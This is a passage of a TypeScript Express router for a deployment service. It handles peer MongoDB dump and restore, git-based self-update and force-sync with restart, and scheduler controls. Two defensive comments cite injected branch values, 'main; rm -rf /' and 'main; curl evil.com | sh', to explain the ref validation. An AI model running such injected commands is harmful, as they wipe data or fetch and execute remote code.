      res.json({ success: false, error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/peers/:id/list-databases — proxy to peer's list-databases for its local infra MongoDB
  router.post('/data-migrations/peers/:id/list-databases', async (req, res) => {
    const peer = stateService.getCdsPeer(req.params.id);
    if (!peer) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    try {
      const result = await peerRequestJson<{ databases: Array<{ name: string; sizeOnDisk: number }>; error?: string }>(
        peer,
        '/api/data-migrations/list-databases',
        'POST',
        { connection: { type: 'local', host: '', port: 0 } },
      );
      res.json(result);
    } catch (e) {
      res.json({ databases: [], error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/peers/:id/list-collections — proxy list-collections for a database on the peer
  router.post('/data-migrations/peers/:id/list-collections', async (req, res) => {
    const peer = stateService.getCdsPeer(req.params.id);
    if (!peer) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    const { database } = req.body as { database?: string };
    if (!database) { res.status(400).json({ error: '请指定 database' }); return; }
    try {
      const result = await peerRequestJson<{ collections: Array<{ name: string; count: number }>; error?: string }>(
        peer,
        '/api/data-migrations/list-collections',
        'POST',
        { connection: { type: 'local', host: '', port: 0, database } },
      );
      res.json(result);
    } catch (e) {
      res.json({ collections: [], error: (e as Error).message });
    }
  });

  // ─────────────────────────────────────────────────────────────────
  //   Streaming endpoints called by remote peers (auth-protected)
  // ─────────────────────────────────────────────────────────────────

  // POST /api/data-migrations/local-dump — streams mongodump bytes for this
  // CDS's local infra MongoDB. Authorized via the standard CDS middleware
  // (cds cookie / X-AI-Access-Key). Used by remote peers to pull data.
  //
  // Body: { database?: string, collections?: string[] }
  router.post('/data-migrations/local-dump', async (req, res) => {
    const body = (req.body || {}) as { database?: string; collections?: string[] };
    let eff: MongoConnectionConfig;
    try {
      eff = resolveMongoConn({ type: 'local', host: '', port: 0, database: body.database });
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
      return;
    }
    const dumpArgs = buildMongodumpArgs(
      eff.host, eff.port,
      {},
      body.database,
      body.collections,
    );
    res.writeHead(200, {
      'Content-Type': 'application/octet-stream',
      'Cache-Control': 'no-cache',
      'X-Accel-Buffering': 'no',
    });
    const child = spawn('mongodump', dumpArgs, { stdio: ['ignore', 'pipe', 'pipe'] });
    let stderrTail = '';
    child.stderr.on('data', (d) => { stderrTail = (stderrTail + d.toString()).slice(-2000); });
    child.stdout.pipe(res);
    child.on('close', (code) => {
      if (code !== 0) {
        // We may already have sent headers — append a trailer-like marker
        try { res.write(`\n__CDS_DUMP_ERROR__:${stderrTail.slice(-400)}`); } catch { /* */ }
      }
      try { res.end(); } catch { /* */ }
    });
    child.on('error', (err) => {
      try {
        if (!res.headersSent) res.status(500).json({ error: err.message });
        else res.end();
      } catch { /* */ }
    });
    // If the client aborts the download, kill the dump.
    // IMPORTANT: use res.on('close'), NOT req.on('close'). In Node.js 18+,
    // req.on('close') fires as soon as express.json() finishes reading the
    // request body (before the handler even writes output), which would
    // kill mongodump immediately and return an empty 0-byte response.
    res.on('close', () => {
      if (!res.writableEnded) { try { child.kill('SIGKILL'); } catch { /* */ } }
    });
  });

  // POST /api/data-migrations/local-restore — pipes request body into
  // mongorestore against this CDS's local infra MongoDB.
  //
  // Query params: sourceDb, targetDb, collections (comma-separated)
  router.post('/data-migrations/local-restore', async (req, res) => {
    const sourceDb = (req.query.sourceDb as string | undefined) || undefined;
    const targetDb = (req.query.targetDb as string | undefined) || undefined;
    const colsParam = req.query.collections as string | undefined;
    const collections = colsParam ? colsParam.split(',').filter(Boolean) : undefined;

    let eff: MongoConnectionConfig;
    try {
      eff = resolveMongoConn({ type: 'local', host: '', port: 0, database: targetDb });
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
      return;
    }
    const restoreArgs = buildMongorestoreArgs(
      eff.host, eff.port,
      {},
      { drop: true, sourceDb, targetDb, collections },
    );
    const child = spawn('mongorestore', restoreArgs, { stdio: ['pipe', 'pipe', 'pipe'] });
    let stderrTail = '';
    const logLines: string[] = [];
    const mirror = (d: Buffer) => {
      const s = d.toString();
      stderrTail = (stderrTail + s).slice(-4000);
      for (const line of s.split('\n')) if (line) logLines.push(line);
    };
    child.stderr.on('data', mirror);
    child.stdout.on('data', mirror);

    // Pipe request body into mongorestore stdin
    req.pipe(child.stdin);

    // If the client aborts upload, kill the restore process
    req.on('error', () => { try { child.kill('SIGKILL'); } catch { /* */ } });
    req.on('close', () => {
      // End of request body — close stdin so mongorestore can finish
      try { child.stdin.end(); } catch { /* */ }
    });

    child.on('close', (code) => {
      if (code === 0) {
        res.json({ success: true, log: logLines.join('\n') });
      } else {
        res.status(500).json({ success: false, error: stderrTail.slice(-400) || `mongorestore exited ${code}`, log: logLines.join('\n') });
      }
    });
    child.on('error', (err) => {
      if (!res.headersSent) res.status(500).json({ success: false, error: err.message });
    });
  });

  // GET /api/self-branches — list git branches of the CDS repo itself
  router.get('/self-branches', async (_req, res) => {
    try {
      const cdsDir = path.join(config.repoRoot, 'cds');
      // Get current branch
      const currentResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: config.repoRoot });
      const currentBranch = currentResult.stdout.trim();

      // Fetch latest (ignore errors if offline)
      await shell.exec('git fetch --all --prune', { cwd: config.repoRoot }).catch(() => {});

      // List all branches (local + remote)
      const localResult = await shell.exec('git branch --format="%(refname:short)"', { cwd: config.repoRoot });
      const localBranches = localResult.stdout.trim().split('\n').filter(Boolean);

      const remoteResult = await shell.exec('git branch -r --format="%(refname:short)"', { cwd: config.repoRoot });
      const remoteBranches = remoteResult.stdout.trim().split('\n')
        .filter(Boolean)
        .filter(b => !b.includes('HEAD'))
        .map(b => b.replace(/^origin\//, ''));

      // Merge and deduplicate
      const allBranches = [...new Set([...localBranches, ...remoteBranches])].sort();

      // Get current commit short hash
      let commitHash = '';
      try {
        const hashResult = await shell.exec('git rev-parse --short HEAD', { cwd: config.repoRoot });
        commitHash = hashResult.stdout.trim();
      } catch { /* ignore */ }

      res.json({ current: currentBranch, commitHash, branches: allBranches });
    } catch (e) {
      res.status(500).json({ error: '获取分支列表失败: ' + (e as Error).message });
    }
  });

  // POST /api/self-update — switch branch + pull + restart CDS (SSE progress)
  router.post('/self-update', async (req, res) => {
    const { branch } = req.body as { branch?: string };

    initSSE(res);
    const send = (step: string, status: string, title: string) => {
      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString() });
    };

    try {
      const repoRoot = config.repoRoot;

      // Step 1: fetch latest
      send('fetch', 'running', '正在拉取远程更新...');
      await shell.exec('git fetch --all --prune', { cwd: repoRoot });
      send('fetch', 'done', '远程更新已拉取');

      // Step 2: switch branch if specified
      if (branch) {
        // Defense-in-depth: even though /api/self-update sits behind
        // cookie/AI-key auth, an authenticated user supplying
        // `branch='main; rm -rf /'` would otherwise run arbitrary
        // commands. Reject shell-unsafe refs before they reach
        // `shell.exec()`.
        if (!isSafeGitRef(branch)) {
          send('checkout', 'error', `拒绝不安全分支名: ${branch.slice(0, 80)}`);
          sendSSE(res, 'error', { message: `不合法的分支名: ${branch}` });
          res.end();
          return;
        }
        send('checkout', 'running', `正在切换到分支 ${branch}...`);
        // Use -f to discard tracked-file changes (safe: untracked files like .cds/state.json are untouched)
        const checkoutResult = await shell.exec(`git checkout -f ${branch}`, { cwd: repoRoot });
        if (checkoutResult.exitCode !== 0) {
          // Try creating tracking branch from remote
          const fallbackResult = await shell.exec(`git checkout -f -b ${branch} origin/${branch}`, { cwd: repoRoot });
          if (fallbackResult.exitCode !== 0) {
            const errMsg = (fallbackResult.stderr || fallbackResult.stdout || '未知错误').trim();
            send('checkout', 'error', `切换分支失败: ${errMsg}`);
            sendSSE(res, 'error', { message: `无法切换到 ${branch}: ${errMsg}` });
            res.end();
            return;
          }
        }
        // Verify the checkout actually worked
        const verifyResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
        const actualBranch = verifyResult.stdout.trim();
        if (actualBranch !== branch) {
          send('checkout', 'error', `切换失败: 期望 ${branch}，实际仍在 ${actualBranch}`);
          sendSSE(res, 'error', { message: `分支切换未生效: 仍在 ${actualBranch}` });
          res.end();
          return;
        }
        send('checkout', 'done', `已切换到 ${branch}`);
      }

      // Step 3: hard-reset local to the remote tip.
      //
      // Prior implementation used `git pull` which creates a merge commit
      // when the local branch has diverged from origin. In managed CDS
      // deployments divergence happens easily (e.g. a prior self-update
      // left a locally-committed state, or the operator ran git commands
      // on the host). An auto-merge can silently drop file changes — we
      // actually hit this: settings.js grew by 438 lines on origin but
      // pull's merge kept the local OLD version, serving stale UI.
      //
      // origin is the source of truth for a managed deployment, so we
      // hard-reset to `origin/<branch>` after fetch. This is destructive
      // to local uncommitted changes (checkout -f above already discards
      // those) and to local-only commits (which shouldn't exist on a
      // prod CDS anyway). For manual debugging branches, operators can
      // still use `git reflog` to recover.
      send('pull', 'running', '正在硬对齐到远端最新...');
      const targetBranch = branch || (await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot })).stdout.trim();
      // Guard the fallback branch too — a corrupted HEAD state could
      // theoretically return something shell-unsafe (unlikely but the
      // check costs nothing).
      if (!isSafeGitRef(targetBranch)) {
        send('pull', 'error', `拒绝不安全分支名: ${targetBranch.slice(0, 80)}`);
        sendSSE(res, 'error', { message: `不合法的 target branch: ${targetBranch}` });
        res.end();
        return;
      }
      const resetResult = await shell.exec(
        `git reset --hard origin/${targetBranch}`,
        { cwd: repoRoot },
      );
      if (resetResult.exitCode !== 0) {
        const errMsg = (resetResult.stderr || resetResult.stdout || '未知错误').trim();
        send('pull', 'error', `硬对齐失败: ${errMsg}`);
        sendSSE(res, 'error', { message: `无法对齐到 origin/${targetBranch}: ${errMsg}` });
        res.end();
        return;
      }
      const newHead = (await shell.exec('git rev-parse --short HEAD', { cwd: repoRoot })).stdout.trim();
      send('pull', 'done', `已对齐到 origin/${targetBranch} @ ${newHead}`);

      // ──────────────────────────────────────────────────────────────
      // Step 3.5: pre-restart validation (P4 Part 18 hardening).
      //
      // The previous self-update killed the running process BEFORE
      // validating that the new code could even start. When Phase D.1
      // added a new npm dep (mongodb) AND I introduced an ESM
      // require() bug, the result was a dead CDS that couldn't be
      // recovered via its own API — a bootstrap trap. This step
      // runs pnpm install + tsc --noEmit inside the current process
      // BEFORE kill+spawn. If anything fails, we abort the restart,
      // leave the running process alive, and surface the error via
      // SSE so the operator knows what to fix.
      // ──────────────────────────────────────────────────────────────
      const cdsDirForCheck = path.join(repoRoot, 'cds');
      send('validate', 'running', '正在校验依赖与编译（pnpm install + tsc --noEmit）...');
      const validation = await validateBuildReadiness(shell, cdsDirForCheck);
      if (!validation.ok) {
        send('validate', 'error', `预检失败: ${validation.error}`);
        sendSSE(res, 'error', {
          message: `self-update 已中止 — 新代码未通过预检: ${validation.error}`,
          stage: validation.stage,
          hint: '原 CDS 进程保持运行中。修复后请重新触发 self-update。',
        });
        res.end();
        return;
      }
      send('validate', 'done', `预检通过: ${validation.summary}`);

      // Step 4: restart CDS via detached process
      send('restart', 'running', '正在重启 CDS...');
      sendSSE(res, 'done', { message: 'CDS 即将重启，页面将在几秒后自动刷新...' });
      res.end();

      // Spawn detached restart script, then exit ourselves.
      // Previous approach relied on exec_cds.sh killing the old process (us),
      // but macOS process group kill behaves differently from Linux.
      // Self-exit is more reliable: we release the port, then exec_cds.sh
      // finds it free and starts the new process cleanly.
      //
      // ⚠ We capture stdout/stderr to a log file instead of `stdio: 'ignore'`
      // so that silent spawn failures (e.g., exec_cds.sh not understanding an
      // argument) leave a forensic trail. Without this, the whole CDS cluster
      // goes dark with no clue why.
      setTimeout(() => {
        const cdsDir = path.join(repoRoot, 'cds');
        const errorLogPath = path.join(cdsDir, '.cds', 'self-update-error.log');
        try {
          // Ensure directory exists
          fs.mkdirSync(path.dirname(errorLogPath), { recursive: true });
          const stamp = new Date().toISOString();
          fs.appendFileSync(errorLogPath, `\n=== self-update spawn at ${stamp} (branch=${branch || '(same)'}) ===\n`);

          const out = fs.openSync(errorLogPath, 'a');
          const errFd = fs.openSync(errorLogPath, 'a');
          const child = spawn('bash', ['./exec_cds.sh', 'daemon'], {
            cwd: cdsDir,
            detached: true,
            stdio: ['ignore', out, errFd],
            env: { ...process.env },
          });
          child.on('error', (err) => {
            fs.appendFileSync(errorLogPath, `spawn error: ${err.message}\n`);
          });
          child.unref();

          // Exit ourselves after a brief delay so exec_cds.sh can bind the port.
          // If the new process failed to start, the next admin to hit CDS will
          // see an empty upstream — and will find a forensic trail in
          // .cds/self-update-error.log.
          setTimeout(() => process.exit(0), 1000);
        } catch (spawnErr) {
          // Something went wrong before spawn; write it out and still exit
          // (caller already received 'done' SSE; they're expecting restart).
          try {
            fs.appendFileSync(errorLogPath, `pre-spawn error: ${(spawnErr as Error).message}\n`);
          } catch { /* can't log either; give up silently */ }
          setTimeout(() => process.exit(1), 500);
        }
      }, 500);
    } catch (err) {
      send('error', 'error', `更新失败: ${(err as Error).message}`);
      sendSSE(res, 'error', { message: (err as Error).message });
      res.end();
    }
  });

  // POST /api/self-update-dry-run — run the pre-restart validation
  // WITHOUT killing the running process or spawning a new one.
  //
  // Body: {} — operates on the currently checked-out source tree.
  //
  // Returns:
  //   { ok: true, summary }              — safe to self-update
  //   { ok: false, stage, error }        — blocking issue
  //
  // Use case: operators (and CI) who want to verify a branch can
  // be self-updated before actually hitting the red button. No
  // side effects — if you see { ok: true } you can confidently
  // call /api/self-update next.
  router.post('/self-update-dry-run', async (_req, res) => {
    const cdsDir = path.join(config.repoRoot, 'cds');
    try {
      const started = Date.now();
      const result = await validateBuildReadiness(shell, cdsDir);
      const durationMs = Date.now() - started;
      if (result.ok) {
        res.json({ ok: true, summary: result.summary, durationMs });
      } else {
        res.status(422).json({
          ok: false,
          stage: result.stage,
          error: result.error,
          durationMs,
          hint:
            result.stage === 'install'
              ? 'pnpm install 失败 — 检查 pnpm-lock.yaml 是否与 package.json 同步，或网络是否能拉到 registry'
              : 'tsc --noEmit 失败 — 新代码有类型错误或 import 解析不到',
        });
      }
    } catch (err) {
      res.status(500).json({
        ok: false,
        stage: 'unknown',
        error: (err as Error).message,
      });
    }
  });

  // ─────────────────────────────────────────────────────────────────────
  // POST /api/self-force-sync — recovery endpoint for divergent repos.
  //
  // When the CDS host's local git checkout has diverged from origin (e.g.
  // a prior self-update silently merged, or an operator made a hot-patch
  // commit), the regular /api/self-update can't recover because its
  // `git pull` keeps creating merge commits that DROP remote changes.
  // This endpoint is the escape hatch: hard-reset to origin + clear the
  // dist/.build-sha cache so the next start recompiles from scratch +
  // restart. Destructive to local commits, intentionally so.
  //
  // Streams SSE so the operator watching the UI gets real-time progress.
  // ─────────────────────────────────────────────────────────────────────
  router.post('/self-force-sync', async (req, res) => {
    const { branch } = (req.body || {}) as { branch?: string };

    initSSE(res);
    const send = (step: string, status: string, title: string, extra?: Record<string, unknown>) => {
      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString(), ...(extra || {}) });
    };

    try {
      const repoRoot = config.repoRoot;
      const cdsDir = path.join(repoRoot, 'cds');

      // Step 1: fetch
      send('fetch', 'running', '正在拉取远端 ref…');
      const fetchRes = await shell.exec('git fetch --all --prune', { cwd: repoRoot, timeout: 60_000 });
      if (fetchRes.exitCode !== 0) {
        send('fetch', 'error', 'git fetch 失败: ' + (combinedOutput(fetchRes) || '').slice(0, 200));
        sendSSE(res, 'error', { message: 'git fetch 失败' });
        res.end();
        return;
      }
      send('fetch', 'done', '远端 ref 已同步');

      // Step 2: resolve target branch (use current if not supplied).
      // Reject shell-unsafe refs up front — the endpoint is auth-gated
      // but defense-in-depth against an attacker with a valid AI key
      // crafting `branch='main; curl evil.com | sh'` is cheap.
      let target = branch;
      if (!target) {
        const cur = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
        target = cur.stdout.trim() || 'main';
      }
      if (!isSafeGitRef(target)) {
        send('resolve', 'error', `拒绝不安全分支名: ${target.slice(0, 80)}`);
        sendSSE(res, 'error', { message: `不合法的 branch: ${target}` });
        res.end();
        return;
      }
      send('resolve', 'done', '目标分支: ' + target);

      // Step 3a: checkout target branch BEFORE the hard reset.
      //
      // Without this, calling with {branch:'develop'} while HEAD is on
      // 'main' would `git reset --hard origin/develop` and move the
      // CURRENT branch (main) to develop's commit — corrupting main's
      // tracking. self-update does this right; we were missing it.
      // Caught by Cursor Bugbot #450 round 7 (HIGH).
      send('checkout', 'running', `切换到 ${target} 分支...`);
      const coRes = await shell.exec(`git checkout -f ${target}`, { cwd: repoRoot, timeout: 30_000 });
      if (coRes.exitCode !== 0) {
        // Fallback: create tracking branch from origin if it doesn't exist
        // locally yet (same dance self-update performs).
        const fbRes = await shell.exec(`git checkout -f -b ${target} origin/${target}`, { cwd: repoRoot, timeout: 30_000 });
        if (fbRes.exitCode !== 0) {
          const errMsg = (combinedOutput(fbRes) || '未知错误').trim();
          send('checkout', 'error', `切换失败: ${errMsg.slice(0, 200)}`);
          sendSSE(res, 'error', { message: `无法切换到 ${target}: ${errMsg}` });
          res.end();
          return;
        }
      }
      // Verify we actually ended up on the target branch — catch any
      // silent checkout-succeeds-but-HEAD-elsewhere edge case.
      const verify = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
      const actual = verify.stdout.trim();
      if (actual !== target) {
        send('checkout', 'error', `切换未生效: 期望 ${target},实际 ${actual}`);
        sendSSE(res, 'error', { message: `git checkout 未生效: 仍在 ${actual}` });
        res.end();
        return;
      }
      send('checkout', 'done', `已切到 ${target}`);

      // Step 3b: hard-reset to origin/<target>
      send('reset', 'running', `硬对齐 HEAD → origin/${target}`);
      const resetRes = await shell.exec(`git reset --hard origin/${target}`, { cwd: repoRoot, timeout: 30_000 });
      if (resetRes.exitCode !== 0) {
        send('reset', 'error', 'reset 失败: ' + (combinedOutput(resetRes) || '').slice(0, 200));
        sendSSE(res, 'error', { message: `git reset --hard origin/${target} 失败` });
        res.end();
        return;
      }
      const newHead = (await shell.exec('git rev-parse --short HEAD', { cwd: repoRoot })).stdout.trim();
      send('reset', 'done', `HEAD = ${newHead}`, { commitHash: newHead });

      // Step 4: drop dist build cache so next start recompiles.
      send('cache', 'running', '清除 dist/.build-sha 编译缓存…');
      const shaFile = path.join(cdsDir, 'dist', '.build-sha');
      try {
        if (fs.existsSync(shaFile)) {
          fs.unlinkSync(shaFile);
          send('cache', 'done', '已删除 .build-sha');
        } else {
          send('cache', 'done', '.build-sha 不存在, 跳过');
        }
      } catch (err) {
        send('cache', 'warning', '删除 .build-sha 失败: ' + (err as Error).message);
      }

      // Step 5: validate new code compiles before restart.
      send('validate', 'running', '预检: pnpm install + tsc --noEmit…');
      const validation = await validateBuildReadiness(shell, cdsDir);
      if (!validation.ok) {
        send('validate', 'error', `预检失败: ${validation.error.slice(0, 300)}`);
        sendSSE(res, 'error', {
          message: `force-sync 已中止 — ${target} 的代码没过预检: ${validation.error}`,
        });
        res.end();
        return;
      }
      send('validate', 'done', validation.summary);

      // Step 6: restart via exec_cds.sh daemon spawn, exit after 1s.
      send('restart', 'running', '正在重启 CDS…');
      sendSSE(res, 'done', { message: `CDS 即将重启, HEAD=${newHead}`, commitHash: newHead });
      res.end();

      // Same restart technique as /api/self-update — spawn a detached bash
      // that runs exec_cds.sh daemon and let the current process die after
      // a short grace period so the child can bind the port.
      const errorLogPath = path.join(cdsDir, '.cds', 'self-update-error.log');
      try {
        fs.mkdirSync(path.dirname(errorLogPath), { recursive: true });
        fs.appendFileSync(
          errorLogPath,
          `\n=== self-force-sync spawn at ${new Date().toISOString()} (branch=${target}) ===\n`,
        );
        const out = fs.openSync(errorLogPath, 'a');
        const errFd = fs.openSync(errorLogPath, 'a');
        const child = spawn('bash', ['./exec_cds.sh', 'daemon'], {
          cwd: cdsDir,
          detached: true,
          stdio: ['ignore', out, errFd],
          env: { ...process.env },
        });
        child.on('error', (err) => {
          fs.appendFileSync(errorLogPath, `spawn error: ${err.message}\n`);
        });
        child.unref();
        setTimeout(() => process.exit(0), 1000);
      } catch (spawnErr) {
        // If we can't spawn the replacement, at least we've persisted the
        // reset — operator can manually `./exec_cds.sh restart` afterwards.
        try {
          fs.appendFileSync(errorLogPath, `pre-spawn error: ${(spawnErr as Error).message}\n`);
        } catch {
          /* ignore */
        }
      }
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
      try { res.end(); } catch { /* already ended */ }
    }
  });

  // ─────────────────────────────────────────────────────────────────────
  // Warm-pool scheduler API (v3.1)
  // See doc/design.cds-resilience.md §九.
  // When schedulerService is not wired in, these endpoints return a
  // consistent "disabled" payload so Dashboard UIs can degrade gracefully.
  // ─────────────────────────────────────────────────────────────────────

  router.get('/scheduler/state', (_req, res) => {
    if (!schedulerService) {
      res.json({
        enabled: false,
        config: null,
        hot: [],
        cold: [],
        capacityUsage: { current: 0, max: 0 },
      });
      return;
    }
    res.json(schedulerService.getSnapshot());
  });

  // ── PUT /api/scheduler/enabled — flip scheduler on/off from the UI ──
  //
  // Persists the override into state.json via stateService so the toggle
  // survives restart, then calls schedulerService.setEnabled() which
  // starts/stops the background tick loop.
  router.put('/scheduler/enabled', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler service not wired in' });
      return;
    }
    const { enabled } = (req.body || {}) as { enabled?: unknown };
    if (typeof enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是 boolean' });
      return;
    }
    stateService.setSchedulerEnabledOverride(enabled);
    stateService.save();
    schedulerService.setEnabled(enabled);
    res.json({ enabled, source: 'ui-override' });
  });

  router.post('/scheduler/pin/:slug', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler not enabled' });
      return;
    }
    try {
      schedulerService.pin(req.params.slug);
      res.json({ ok: true, slug: req.params.slug, pinned: true });
    } catch (err) {
      res.status(404).json({ error: (err as Error).message });
    }
  });

  router.post('/scheduler/unpin/:slug', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler not enabled' });
      return;
    }
    try {
      schedulerService.unpin(req.params.slug);
      res.json({ ok: true, slug: req.params.slug, pinned: false });
    } catch (err) {
      res.status(404).json({ error: (err as Error).message });
    }
  });

  router.post('/scheduler/cool/:slug', async (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler not enabled' });
      return;
    }
    const slug = req.params.slug;
    const branch = stateService.getBranch(slug);
    if (!branch) {
      res.status(404).json({ error: `分支 "${slug}" 不存在` });
      return;
    }
    if (schedulerService.isPinned(branch)) {
      res.status(409).json({ error: `分支 "${slug}" 已固定,无法手动休眠` });
      return;
    }
    try {
      await schedulerService.markCold(slug);
      res.json({ ok: true, slug, heatState: 'cold' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // P4 Part 18 (G10): POST /api/detect-stack — auto-detect stack.
  //
  // Body: { projectId?, branchId?, path? }
  //
  // The route figures out which filesystem path to scan:
  //   - `path` is absolute → use as-is (rare, escape hatch)
  //   - `branchId` → use that branch's worktree
  //   - `projectId` → use the project's repoPath / cloned repo
  //   - neither → fall back to config.repoRoot
  //
  // Returns the raw StackDetection from detectStack(). BuildProfile
  // form consumers pick dockerImage / installCommand / buildCommand
  // / runCommand from the response. Never throws on unknown stack;
  // the client just shows the summary when confidence is 0.
  router.post('/detect-stack', (req, res) => {
    const { projectId, branchId, path: explicitPath } = (req.body || {}) as {
      projectId?: string;
      branchId?: string;
      path?: string;
    };

    let scanPath: string;
    if (typeof explicitPath === 'string' && explicitPath.length > 0 && path.isAbsolute(explicitPath)) {
      scanPath = explicitPath;
    } else if (branchId) {
      const entry = stateService.getBranch(branchId);
      if (!entry) {
        res.status(404).json({ error: `分支 "${branchId}" 不存在` });
        return;
      }
      scanPath = entry.worktreePath;
    } else if (projectId) {
      scanPath = stateService.getProjectRepoRoot(projectId, config.repoRoot);
    } else {
      scanPath = config.repoRoot;
    }

    try {
      const detection = detectStack(scanPath);
      res.json({ ...detection, scanPath });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  return router;
}
